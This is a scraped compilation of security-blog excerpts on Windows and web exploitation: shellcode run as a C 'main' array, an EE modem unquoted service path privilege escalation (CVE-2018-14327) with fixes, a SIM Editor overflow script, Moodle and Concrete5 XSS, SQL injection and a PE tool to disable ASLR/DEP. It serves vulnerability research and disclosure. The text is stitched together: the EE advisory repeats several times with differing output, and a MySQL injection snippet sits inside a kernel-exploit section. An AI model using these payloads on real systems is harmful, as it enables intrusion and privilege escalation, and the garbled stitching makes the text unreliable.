## [Running Shellcode Directly in C](https://osandamalith.com/2019/08/27/running-shellcode-directly-in-c/)

Here‚Äôs a cool thing I figured out in position-independent code. I would rephrase the title as running position-independent code instead of shellcode. Check my previous article [Executing Shellcode Directly](https://osandamalith.com/2017/04/11/executing-shellcode-directly/) where I used a minimal PE and pointed the AddressofEntryPoint to the beginning of the PIC.

So the goal is to run shellcode in C without any function pointers or any functions at all, not even a main function üôÇ For example, this is all the code. I declare the variable name as ‚Äúmain‚Äù. I am using the Microsoft‚Äôs Visual C compiler with no parameters.

char main[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"

"\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01"
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75"
"\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
"\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53"
"\x53\x53\x53\x53\x52\x53\xff\xd7";

After compiling it won‚Äôt of course run. Why? Well, the initialized data will end up in the ‚Äú.data‚Äù section.

## [EE 4GEE Mini Local Privilege Escalation Vulnerability (CVE-2018-14327)](https://osandamalith.com/2018/09/17/ee-4gee-mini-local-privilege-escalation-vulnerability-cve-2018-14327/)

I brought a 4G modem from EE to browser internet when I‚Äôm outside. It‚Äôs a portable 4G WiFi mobile broadband modem as seen below.

![](https://i0.wp.com/brain-images-ssl.cdn.dixons.com/4/9/10146494/u_10146494.jpg?resize=374%2C332&ssl=1)

You can find this 4G modem from these websites:

* <https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-wifi-mini-2018/details>
* <https://www.currys.co.uk/gbuk/phones-broadband-and-sat-nav/broadband/mobile-broadband/4gee-mini-pay-as-you-go-mobile-wifi-10146494-pdt.html>

One day I had a look at my services installed on my computer for troubleshooting a problem and I saw a strange service named ‚ÄúAlcatel OSPREY3\_MINI Modem Device Helper‚Äù. I was wondering how this was installed, and then I figured that it‚Äôs my modem service from the EE 4G WiFi modem. Then after a bit of Googling, I realized that the modem was manufactured by Alcatel. I had a look at the service installed just for curiosity and found that that there is an unquoted service path vulnerability.

[code language=‚Äùtext‚Äù highlight=‚Äù8‚Ä≥]

C:\>sc qc "Alcatel OSPREY3\_MINI Modem Device Helper"

[SC] QueryServiceConfig SUCCESS

SERVICE\_NAME: Alcatel OSPREY3\_MINI Modem Device Helper

TYPE : 110 WIN32\_OWN\_PROCESS (interactive)

START\_TYPE : 2 AUTO\_START

LOAD\_ORDER\_GROUP :

TAG : 0

DISPLAY\_NAME : Alcatel OSPREY3\_MINI Modem Device Helper

DEPENDENCIES :

SERVICE\_START\_NAME : LocalSystem

[/code]

But you can‚Äôt directly write files because of folder permissions. I first thought this issue is useless to be reported. But just to be sure I had a look at the folder permissions of the ‚ÄúEE40‚Äù folder and W00t! It had been set to ‚ÄúEveryone:(OI)(CI)(F)‚Äù which means any user can read, write, execute, create, delete do anything inside that folder and it‚Äôs subfolders. The ACL rules had OI ‚Äì Object Inherit and CI ‚Äì Container Inherit which means all the files in this folder and subfolders have full permissions.

## [Exploiting Format Strings in Windows](https://osandamalith.com/2018/02/01/exploiting-format-strings-in-windows/)

I thought of making a small [challenge](https://github.com/OsandaMalith/Exploits/blob/master/Challenges/Challenge%20-%201.7z?raw=true) in exploiting format strings in Windows. This is how it looks, it asks for a filename to open. At first this might be a bit confusing. There‚Äôs no vulnerable functions in reading a file. You can see that our first argument to the program is echoed back in the program.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/02/1.png?resize=513%2C226&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/02/1.png?ssl=1)

Let‚Äôs investigate this inside a debugger. As you can see if argc == 2 the application continues the flow and argv[1] is passed into that function highlighted.

## [Windows Kernel Exploitation: Stack Overflow](https://osandamalith.com/2017/04/05/windows-kernel-exploitation-stack-overflow/)

# Introduction

This post is on exploiting a stack based buffer overflow in the [HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver).

There‚Äôs lot of background theory required to understand types of Windows drivers, developing drivers, debugging drivers, etc. I will only focus on developing the exploit while explaining some internal structures briefly. I would assume you have experience with assembly, C, debugging in the userland.

This driver is a kernel driver. A driver is typically used to get our code into the kernel. An unhandled exception will cause the famous BSOD. I will be using Windows 7 32-bit for this since it doesn‚Äôt support SMEP (Supervisor Mode Execution Prevention) or SMAP (Supervisor Mode Access Prevention). In simple words, I would say that when SMEP is enabled the CPU will generate a fault whenever the ring0 tries to execute code from a page marked with the user bit. Basically, due to this being not enabled, we can map our shellcode to steal the ‚ÄòSystem‚Äô token. Check the Shellcode Analysis part for the analysis. Exploiting this vulnerability on a 64-bit system is different.

You can use the [OSR Driver Loader](https://www.osronline.com/article.cfm?article=157) to load the driver into the system.

If you want to debug the machine itself using windbg you can use [VirtualKD](http://virtualkd.sysprogs.org/) or [LiveKD](https://technet.microsoft.com/en-us/sysinternals/livekd.aspx)

You can add a new serial connection using VirtualBox or VMware, so you can debug the guest system via windbg. I will be using a serial connection from VMware.

For kernel data structures refer to [this](http://www.codemachine.com/article_kernelstruct.html). I have used it mostly to refer the structures.

After you have registered the driver you should see this in ‚Äòmsinfo32‚Äô.

If you check the loaded modules in the ‚ÄòSystem‚Äô process you should see our kernel driver ‚ÄòHEVD.sys‚Äô.

[code language=‚Äùsql‚Äù]

SELECT \* FROM `table\_name` PROCEDURE ANALYSE((SELECT\*FROM(SELECT 1)x),1);

[/code]

So an Example POC would be:

[code language=‚Äùsql‚Äù]

select \* from information\_schema.tables procedure analyse((select\*from(select 1)x),1);

[/code]

[code language=‚Äùsql‚Äù]

‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî

mysql> select \* from information\_schema.tables procedure analyse((select\*from(select 1)x),1);

## [Sim Editor Stack Based Buffer Overflow](https://osandamalith.com/2015/01/16/sim-editor-stack-based-buffer-overflow/)

Last week I bought a SIM card reader. Along with it came the software for it. It was SIM Card Editor 6.6. You can download it from [here](https://www.dropbox.com/s/zsl13fwy8gs44a6/SIMutil.7z?dl=0). The app is pretty cool. You can manipulate the SIM card‚Äôs data with it. However I noticed something strange in this application. When we are loading file for example suppose with 4 ‚ÄúA‚Äù characters we would get the output as ‚Äú¬™¬™‚Äù. Just two characters will be displayed. When I gave the input as ‚Äú4141‚Äù the result would be ‚ÄúAA‚Äù. This time the correct output we need. What was the reason for this? From what I noticed was that when we enter ‚ÄúAAAA‚Äù the hex values would be ‚Äú\x41\x41\x41\x41‚Äù the app will take two values each and evaluate to hex.

When we give the input as ‚Äú4141‚Äù this is what happens.

So suppose we want to enter a hex string we have to just give the input. For example we want to give the application ‚ÄúAA‚Äù we have to give just ‚Äú4141‚Äù. Taking that into consideration the rest was easy. The return address is overwritten with our buffer.

[code language=‚Äùpython‚Äù]

buff = "41" \* 500

with open("ex.sms", ‚Äòw‚Äô) as f:

f.write(buff)

[/code]

## [Escalating Local Privileges Using Mobile Partner](https://osandamalith.com/2014/10/20/escalating-local-privileges-using-mobile-partner/)

Mobile Partner is a very popular software that ships with Huawei internet dongles. Recently I noticed the fact that the ‚ÄúMobile Partner‚Äù directory and all subdirectories, files by default has full permissions granted the Users group. This means that any User in your system can plant a malicious executable and escalate privileges when the Administrator runs Mobile Partner. Why not bind the exe using msfpayload or msfvenom? üòâ

## Proof of Concept

By default in my dongle I had Mobile Partner 11.302.09.00.03 and if you are using versions below you might find out that this folder and it‚Äôs contents has been granted full permissions not only to the Users group but also to Everyone which means any random user can plant anything inside this directory.

## [Moodle 2.7 Persistent XSS](https://osandamalith.com/2014/07/25/moodle-2-7-persistent-xss/)

# Overview

I hope you all have heard about the Moodle project. The full form is Moodle Modular Object-Oriented Dynamic Learning Environment. This project is a free open-source project which focuses in teaching and learning online courses effectively. Most of the universities, colleges, educational institutes use this application in interacting with students. You can read and research more information on [Wikipedia](http://en.wikipedia.org/wiki/Moodle).

# Vulnerability and Exploit

This is a persistent XSS I found in Moodle 2.7. Well, this vulnerability was present from the version 2.4.9 till 2.7 so far hidden from the eye üòâ luckily I spotted this while I was fuzzing random stuff against the application.

Edit your user profile and under ‚ÄúOptional‚Äù you can see ‚ÄúSkype ID‚Äù. Let‚Äôs inject some HTML into the Skype ID field and check the output

[code language=‚Äùhtml‚Äù]

‚Äú>>><h1>Hello World</h1>

[/code]

It seems like our input is echoed back thrice. In one line the input is being URL encoded since it should be the URL of the user and in another it is being converted to HTML entities, while in the other field it seems like our input is being filtered out. I love to break filters. Here is my quick and small analysis in detail.

Output 1:

[code language=‚Äùhtml‚Äù]

<a href=‚Äùskype:%22%3E%3E%3EHello+World?call‚Äù>

[/code]

Output 2:

[code language=‚Äùhtml‚Äù]

&quot;&gt;&gt;&gt;Hello World

[/code] [(more‚Ä¶)](https://osandamalith.com/2014/07/25/moodle-2-7-persistent-xss/#more-1163)

## [Concrete 5.6.2.1 Multiple XSS](https://osandamalith.com/2014/07/18/concrete-5-6-2-1-multiple-xss/)

While I was playing around with Concrete 5.6.2.1 CMS, I wanted to know how this application shows us a hyperlink to the ‚ÄúBack‚Äù button. I found something interesting in the ‚Äúdownload\_file.php‚Äù file.

 `\concrete\single_pages\download_file.php`

line 27

[code language=‚Äùphp‚Äù highlight=‚Äù5‚Ä≥]

<form action="<?php echo View::url(‚Äò/download\_file‚Äô, ‚Äòsubmit\_password‚Äô, $fID) ?>" method="post">

<?php if(isset($force)) { ?>

<input type="hidden" value="<?php echo $force ?>" name="force" />

<?php } ?>

<input type="hidden" value="<?php echo $returnURL ?>" name="returnURL" />

<input type="hidden" value="<?php echo $rcID ?>" name="rcID"/>

<label for="password"><?php echo t(‚ÄòPassword‚Äô)?>: <input type="password" name="password" /></label>

<br /><br />

<button type="submit"><?php echo t(‚ÄòDownload‚Äô)?></button>

</form>

[/code]

Let‚Äôs have a look at the ‚Äú$returnURL‚Äù variable. [(more‚Ä¶)](https://osandamalith.com/2014/07/18/concrete-5-6-2-1-multiple-xss/#more-1123)

# [PE Sec Info ‚Äì A Simple Tool to Manipulate ASLR and DEP Flags](https://osandamalith.com/2018/10/24/pe-sec-info-a-simple-tool-to-manipulate-aslr-and-dep-flags/)

Recently I was interested in exploring the PE headers and writing simple programs to manipulate different headers. There are thousands of applications and code to be found on this topic. I started by exploring this Windows structure called ‚ÄúLOADED\_IMAGE‚Äù.

typedef struct \_LOADED\_IMAGE {
PSTR ModuleName;
HANDLE hFile;
PUCHAR MappedAddress;
#if ...
PIMAGE\_NT\_HEADERS64 FileHeader;
#else
PIMAGE\_NT\_HEADERS32 FileHeader;
#endif
PIMAGE\_SECTION\_HEADER LastRvaSection;
ULONG NumberOfSections;
PIMAGE\_SECTION\_HEADER Sections;
ULONG Characteristics;
BOOLEAN fSystemImage;
BOOLEAN fDOSImage;
BOOLEAN fReadOnly;
UCHAR Version;
LIST\_ENTRY Links;
ULONG SizeOfImage;
} LOADED\_IMAGE, \*PLOADED\_IMAGE;

| 1234567891011121314151617181920 | typedef struct \_LOADED\_IMAGE {¬†¬†PSTR¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†ModuleName;¬†¬†HANDLE¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†hFile;¬†¬†PUCHAR¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†MappedAddress;#if ...¬†¬†PIMAGE\_NT\_HEADERS64¬†¬† FileHeader;#else¬†¬†PIMAGE\_NT\_HEADERS32¬†¬† FileHeader;#endif¬†¬†PIMAGE\_SECTION\_HEADER LastRvaSection;¬†¬†ULONG¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† NumberOfSections;¬†¬†PIMAGE\_SECTION\_HEADER Sections;¬†¬†ULONG¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† Characteristics;¬†¬†BOOLEAN¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† fSystemImage;¬†¬†BOOLEAN¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† fDOSImage;¬†¬†BOOLEAN¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† fReadOnly;¬†¬†UCHAR¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† Version;¬†¬†LIST\_ENTRY¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†Links;¬†¬†ULONG¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† SizeOfImage;} LOADED\_IMAGE, \*PLOADED\_IMAGE; |

<https://docs.microsoft.com/en-us/windows/desktop/api/dbghelp/ns-dbghelp-_loaded_image>

I fired up WinDBG and had a close a look how these look like with mapped memory addresses.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/loaded_image.png?resize=387%2C313&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/loaded_image.png?ssl=1)

The ‚ÄòMappedAddress‚Äô member is our pointer to the PE file. If I check the headers, I can see all the information about the PE.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/headers.png?resize=365%2C620&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/headers.png?ssl=1)

The ‚ÄòFileHeader‚Äô member which is a pointer to ‚ÄòPIMAGE\_NT\_HEADERS32‚Äô or ‚ÄòPIMAGE\_NT\_HEADERS64‚Äô contains all the necessary information of the PE. As you can see I was able to locate the member ‚ÄòDllCharacteristics‚Äô.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/image_nt_headers_2.png?resize=379%2C670&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/image_nt_headers_2.png?ssl=1)

While I was exploring these structures using the debugger I got really interested in programming tiny tools. I wanted to learn this using MASM which was challenging.

For example, let‚Äôs say I want to disable DEP from the target PE. I could write a simple function as follows.

disableDep proc PE:LOADED\_IMAGE
xor edx, edx
xor eax, eax
mov ebx, PE.FileHeader
mov eax, IMAGE\_DLLCHARACTERISTICS\_NX\_COMPAT
not eax
and dword ptr [ebx].IMAGE\_NT\_HEADERS32.OptionalHeader.DllCharacteristics, eax
ret
disableDep EndP

| 123456789 | disableDep proc PE:LOADED\_IMAGE xor edx, edx xor eax, eax mov ebx, PE.FileHeader mov eax, IMAGE\_DLLCHARACTERISTICS\_NX\_COMPAT not eax and dword ptr [ebx].IMAGE\_NT\_HEADERS32.OptionalHeader.DllCharacteristics, eax retdisableDep EndP |
| --- | --- |

So I wrote a tiny application using MASM to view these security flags from the PE and to enable and disable ASlR, DEP flags.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/pesecinfo.png?resize=416%2C270&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/pesecinfo.png?ssl=1)

Sample test run

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/normal.png?resize=471%2C174&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/normal.png?ssl=1)

Download:¬†<https://github.com/OsandaMalith/PESecInfo/releases>

Click on the below gif to look in action of disabling DEP in a vulnerable application.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/dep.gif?resize=640%2C328&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/dep.gif?ssl=1)

This is another example where a binary which is compiled with DynamicBase, and this is how the base address looks like, randomized.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/asle_yes.png?resize=593%2C133&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/asle_yes.png?ssl=1)

After disabling ASLR using this tool, the Windows loader will load from the value at the ‚ÄúImageBase‚Äù member which is 0x00400000 in this case.

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/aslr_no.png?resize=553%2C105&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/10/aslr_no.png?ssl=1)

The flags are checked by the Windows loader so by manipulating them, we can disable these security features from the target EXE or DLL. I wrote this little tool in MASM to learn the language. This is totally random üôÇ

##### About The Exploit Database

√ó

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as ‚ÄúGoogle Hacking‚Äù was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny‚Äôs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term ‚ÄúGoogledork‚Äù to refer
to ‚Äúa foolish or inept person as revealed by Google‚Äú. This was meant to draw attention to
the fact that this was not a ‚ÄúGoogle problem‚Äù but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term ‚Äúdork‚Äù became shorthand for a search query that located sensitive
information and ‚Äúdorks‚Äù were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## [EE 4GEE Mini Local Privilege Escalation Vulnerability (CVE-2018-14327)](https://osandamalith.com/2018/09/17/ee-4gee-mini-local-privilege-escalation-vulnerability-cve-2018-14327/)

I brought a 4G modem from EE to browser internet when I‚Äôm outside. It‚Äôs a portable 4G WiFi mobile broadband modem as seen below.

![](https://i0.wp.com/brain-images-ssl.cdn.dixons.com/4/9/10146494/u_10146494.jpg?resize=374%2C332&ssl=1)

You can find this 4G modem from these websites:

* <https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-wifi-mini-2018/details>
* <https://www.currys.co.uk/gbuk/phones-broadband-and-sat-nav/broadband/mobile-broadband/4gee-mini-pay-as-you-go-mobile-wifi-10146494-pdt.html>

One day I had a look at my services installed on my computer for troubleshooting a problem and I saw a strange service named ‚ÄúAlcatel OSPREY3\_MINI Modem Device Helper‚Äù. I was wondering how this was installed, and then I figured that it‚Äôs my modem service from the EE 4G WiFi modem. Then after a bit of Googling, I realized that the modem was manufactured by Alcatel. I had a look at the service installed just for curiosity and found that that there is an unquoted service path vulnerability.

[code language=‚Äùtext‚Äù highlight=‚Äù8‚Ä≥]

C:\>sc qc "Alcatel OSPREY3\_MINI Modem Device Helper"

[SC] QueryServiceConfig SUCCESS

SERVICE\_NAME: Alcatel OSPREY3\_MINI Modem Device Helper

TYPE : 110 WIN32\_OWN\_PROCESS (interactive)

START\_TYPE : 2 AUTO\_START

ERROR\_CONTROL : 1 NORMAL

BINARY\_PATH\_NAME : C:\Program Files (x86)\Web Connecton\EE40\BackgroundService\ServiceManager.exe -start

LOAD\_ORDER\_GROUP :

DEPENDENCIES :

[/code]

But you can‚Äôt directly write files because of folder permissions. I first thought this issue is useless to be reported. But just to be sure I had a look at the folder permissions of the ‚ÄúEE40‚Äù folder and W00t! It had been set to ‚ÄúEveryone:(OI)(CI)(F)‚Äù which means any user can read, write, execute, create, delete do anything inside that folder and it‚Äôs subfolders. The ACL rules had OI ‚Äì Object Inherit and CI ‚Äì Container Inherit which means all the files in this folder and subfolders have full permissions.

## [EE 4GEE Mini Local Privilege Escalation Vulnerability (CVE-2018-14327)](https://osandamalith.com/2018/09/17/ee-4gee-mini-local-privilege-escalation-vulnerability-cve-2018-14327/)

I brought a 4G modem from EE to browser internet when I‚Äôm outside. It‚Äôs a portable 4G WiFi mobile broadband modem as seen below.

![](https://i0.wp.com/brain-images-ssl.cdn.dixons.com/4/9/10146494/u_10146494.jpg?resize=374%2C332&ssl=1)

You can find this 4G modem from these websites:

* <https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-wifi-mini-2018/details>
* <https://www.currys.co.uk/gbuk/phones-broadband-and-sat-nav/broadband/mobile-broadband/4gee-mini-pay-as-you-go-mobile-wifi-10146494-pdt.html>

One day I had a look at my services installed on my computer for troubleshooting a problem and I saw a strange service named ‚ÄúAlcatel OSPREY3\_MINI Modem Device Helper‚Äù. I was wondering how this was installed, and then I figured that it‚Äôs my modem service from the EE 4G WiFi modem. Then after a bit of Googling, I realized that the modem was manufactured by Alcatel. I had a look at the service installed just for curiosity and found that that there is an unquoted service path vulnerability.

[code language=‚Äùtext‚Äù highlight=‚Äù8‚Ä≥]

C:\>sc qc "Alcatel OSPREY3\_MINI Modem Device Helper"

[SC] QueryServiceConfig SUCCESS

SERVICE\_NAME: Alcatel OSPREY3\_MINI Modem Device Helper

TYPE : 110 WIN32\_OWN\_PROCESS (interactive)

[/code]

But you can‚Äôt directly write files because of folder permissions. I first thought this issue is useless to be reported. But just to be sure I had a look at the folder permissions of the ‚ÄúEE40‚Äù folder and W00t! It had been set to ‚ÄúEveryone:(OI)(CI)(F)‚Äù which means any user can read, write, execute, create, delete do anything inside that folder and it‚Äôs subfolders. The ACL rules had OI ‚Äì Object Inherit and CI ‚Äì Container Inherit which means all the files in this folder and subfolders have full permissions.

Since ‚ÄúServiceManager.exe‚Äù executable is a Windows service, by planting a malicious program with the same name ‚ÄúServiceManager.exe‚Äù would result in executing the binary as ‚ÄúNT AUTHORITY\SYSTEM‚Äù giving highest privileges in a Windows operating system. This vulnerability can be used to escalate privileges in a Windows operating system locally. For example, an attacker can plant a reverse shell from a low privileged user account and by restarting the computer, the malicious service will be started as ‚ÄúNT AUTHORITY\SYSTEM‚Äù by giving the attacker full system access to the remote PC.

The following video demonstrates how this issue can be used to escalate privileges and gain a remote shell running as ‚ÄúNT AUTHORITY\SYSTEM‚Äù.

# Patching Your Firmware

The vulnerable software version is ‚ÄúEE40\_00\_02.00\_44‚Äù

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/09/1.png?resize=640%2C523&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/09/1.png?ssl=1)

After reporting the vulnerability to EE, they have released a patch to update the modem. Follow these steps to update your modem to the latest patch update.

1. Go to your router‚Äôs default gateway: http://192.168.1.1.
2. Click on the ‚ÄúCheck for Update‚Äù text to update your firmware.

After updating, the patched software version is ‚ÄúEE40\_00\_02.00\_45‚Äù and remove the previously installed software from your computer.

# Fixing the Unquoted Service Path Vulnerability Manually

To fix the unquoted service path vulnerability follow these steps.

1. Open the Windows Registry Editor by typing ‚Äúregedit‚Äù in start menu or in the Run prompt.
2. Go to the following location:

   `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Alcatel OSPREY3_MINI Modem Device Helper`
3. Add double quotes to the ‚ÄúImagePath‚Äù value.

   `"C:\Program Files (x86)\Web Connecton\EE40\BackgroundService\ServiceManager.exe -start"`

[![](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/09/registry.png?resize=640%2C177&ssl=1)](https://i0.wp.com/osandamalith.com/wp-content/uploads/2018/09/registry.png?ssl=1)

This can be done in this manner too. You must open a CMD prompt with Administrative privileges and run this command.

**For 64-bit Windows**

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Alcatel OSPREY3_MINI Modem Device Helper" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Program Files (x86)\Web Connecton\EE40\BackgroundService\ServiceManager.exe -start\"" /f`

**For 32-bit Windows**

`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Alcatel OSPREY3_MINI Modem Device Helper" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Program Files\Web Connecton\EE40\BackgroundService\ServiceManager.exe -start\"" /f`

# Fixing the Weak Folder Permissions Manually

Open a CMD prompt and go to the location of the Alcatel modem service and type the following the command.

`cd ‚ÄúC:\Program Files\Web Connecton\‚Äù

icacls "EE40" /t /grant:r Everyone:(OI)(CI)R`

Telco EE's Mini Wi-Fi modem needs to be updated with a recently issued patch.

A local privilege escalation [vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14327) in the Alcatel-manufactured tech, discovered by ZeroDayLab, could be used to plant malware or steal info from Windows computers that use the kit for internet connectivity, the researchers warned.

This vulnerability can be used to escalate privileges in a Windows operating system locally. For example, an attacker can plant a reverse shell from a low-privileged user account and by restarting the computer, the malicious service will be started as "NT AUTHORITY\SYSTEM" by giving the attacker full system access to the remote PC.

The bug was uncovered by Osanda Malith Jayathissa, a security consultant at ZeroDayLab, and reported to EE in July. EE worked with Jayathissa and Alcatel to develop a patch, which was rolled out earlier this month. This cleared the way for ZeroDayLab to go public about the problem responsibly.

"This vulnerability can be used to escalate system privileges on any Windows machine locally," Jayathissa confirmed to *El Reg*.

The kit's software needs updating to "EE40\_00\_02.00\_45" and previous vulnerable versions should be removed, as described in an advisory by ZeroDayLab [here](http://blog.zerodaylab.com/2018/09/zerodaylab-discovers-ee-unquoted.html).

In response to queries from *El Reg*, EE confirmed it had resolved what it characterised as a minor security issue with a patch. It nonetheless thanked Jayathissa for his efforts.

EE said the attacker would have needed physical access to a Wi-Fi modem that had been plugged directly into the laptop or PC via USB and left unattended or unlocked. This sort of scenario could happen in trains, shared office spaces and cafes so it isn't implausible, just clearly not super critical.

Jayathissa added that other vendors using the same kit might also be vulnerable. The possibility of wider exposure has not been tested and remains unconfirmed.

# [EE 4GEE Mini Local Privilege Escalation Vulnerability (CVE-2018-14327)](https://osandamalith.com/2018/09/17/ee-4gee-mini-local-privilege-escalation-vulnerability-cve-2018-14327/)

I brought a 4G modem from EE to browser internet when I‚Äôm outside. It‚Äôs a portable 4G WiFi mobile broadband modem as seen below.

![](https://i0.wp.com/brain-images-ssl.cdn.dixons.com/4/9/10146494/u_10146494.jpg?resize=374%2C332&ssl=1)

You can find this 4G modem from these websites:

* <https://shop.ee.co.uk/dongles/pay-monthly-mobile-broadband/4gee-wifi-mini-2018/details>
* <https://www.currys.co.uk/gbuk/phones-broadband-and-sat-nav/broadband/mobile-broadband/4gee-mini-pay-as-you-go-mobile-wifi-10146494-pdt.html>

One day I had a look at my services installed on my computer for troubleshooting a problem and I saw a strange service named ‚ÄúAlcatel OSPREY3\_MINI Modem Device Helper‚Äù. I was wondering how this was installed, and then I figured that it‚Äôs my modem service from the EE 4G WiFi modem. Then after a bit of Googling, I realized that the modem was manufactured by Alcatel. I had a look at the service installed just for curiosity and found that that there is an unquoted service path vulnerability.

[code language=‚Äùtext‚Äù highlight=‚Äù8‚Ä≥]

C:\>sc qc "Alcatel OSPREY3\_MINI Modem Device Helper"

[SC] QueryServiceConfig SUCCESS

SERVICE\_NAME: Alcatel OSPREY3\_MINI Modem Device Helper

TYPE : 110 WIN32\_OWN\_PROCESS (interactive)

DEPENDENCIES :

[/code]

But you can‚Äôt directly write files because of folder permissions. I first thought this issue is useless to be reported. But just to be sure I had a look at the folder permissions of the ‚ÄúEE40‚Äù folder and W00t! It had been set to ‚ÄúEveryone:(OI)(CI)(F)‚Äù which means any user can read, write, execute, create, delete do anything inside that folder and it‚Äôs subfolders. The ACL rules had OI ‚Äì Object Inherit and CI ‚Äì Container Inherit which means all the files in this folder and subfolders have full permissions.

Since ‚ÄúServiceManager.exe‚Äù executable is a Windows service, by planting a malicious program with the same name ‚ÄúServiceManager.exe‚Äù would result in executing the binary as ‚ÄúNT AUTHORITY\SYSTEM‚Äù giving highest privileges in a Windows operating system. This vulnerability can be used to escalate privileges in a Windows operating system locally. For example, an attacker can plant a reverse shell from a low privileged user account and by restarting the computer, the malicious service will be started as ‚ÄúNT AUTHORITY\SYSTEM‚Äù by giving the attacker full system access to the remote PC.

The following video demonstrates how this issue can be used to escalate privileges and gain a remote shell running as ‚ÄúNT AUTHORITY\SYSTEM‚Äù.

# Patching Your Firmware

The vulnerable software version is ‚ÄúEE40\_00\_02.00\_44‚Äù

